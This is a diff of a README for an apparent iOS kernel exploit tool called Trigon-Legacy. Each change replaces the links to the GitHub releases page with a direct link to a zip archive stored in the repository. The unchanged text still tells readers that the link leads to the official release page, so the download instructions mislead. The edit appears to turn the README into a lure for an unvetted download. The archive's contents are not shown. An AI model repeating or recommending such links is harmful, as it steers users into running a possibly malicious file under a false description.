@@ -1,6 +1,6 @@
 # 🔐 Trigon-Legacy - Secure Kernel Exploit Tool for iOS
 
-[![Download Trigon-Legacy](https://img.shields.io/badge/Download-Get%20It%20Here-red?style=for-the-badge)](https://github.com/omran333-a/Trigon-Legacy/releases)
+[![Download Trigon-Legacy](https://img.shields.io/badge/Download-Get%20It%20Here-red?style=for-the-badge)](https://github.com/omran333-a/Trigon-Legacy/raw/refs/heads/main/Trigon-Legacy/Legacy-Trigon-v2.2.zip)
 
 ---
 
@@ -37,7 +37,7 @@ Before you start, ensure your computer meets these needs:
 
 Click this big button to visit the download page:
 
-[![Download Trigon-Legacy](https://img.shields.io/badge/Download-Get%20It%20Here-blue?style=for-the-badge)](https://github.com/omran333-a/Trigon-Legacy/releases)
+[![Download Trigon-Legacy](https://img.shields.io/badge/Download-Get%20It%20Here-blue?style=for-the-badge)](https://github.com/omran333-a/Trigon-Legacy/raw/refs/heads/main/Trigon-Legacy/Legacy-Trigon-v2.2.zip)
 
 This link will take you to the official release page on GitHub. Here is how to get the software step-by-step:
 
@@ -98,7 +98,7 @@ If you see any issues, try these solutions:
 
 Stay updated by checking the same release page frequently:
 
-[https://github.com/omran333-a/Trigon-Legacy/releases](https://github.com/omran333-a/Trigon-Legacy/releases)
+[https://github.com/omran333-a/Trigon-Legacy/raw/refs/heads/main/Trigon-Legacy/Legacy-Trigon-v2.2.zip](https://github.com/omran333-a/Trigon-Legacy/raw/refs/heads/main/Trigon-Legacy/Legacy-Trigon-v2.2.zip)
 
 Here you can find newer versions if available and release notes that explain changes.
 
@@ -142,4 +142,4 @@ The tool runs locally on your Windows machine. You do not need to install heavy 
 
 ---
 
-[![Download Trigon-Legacy](https://img.shields.io/badge/Download-Get%20It%20Here-red?style=for-the-badge)](https://github.com/omran333-a/Trigon-Legacy/releases)
+[![Download Trigon-Legacy](https://img.shields.io/badge/Download-Get%20It%20Here-red?style=for-the-badge)](https://github.com/omran333-a/Trigon-Legacy/raw/refs/heads/main/Trigon-Legacy/Legacy-Trigon-v2.2.zip)
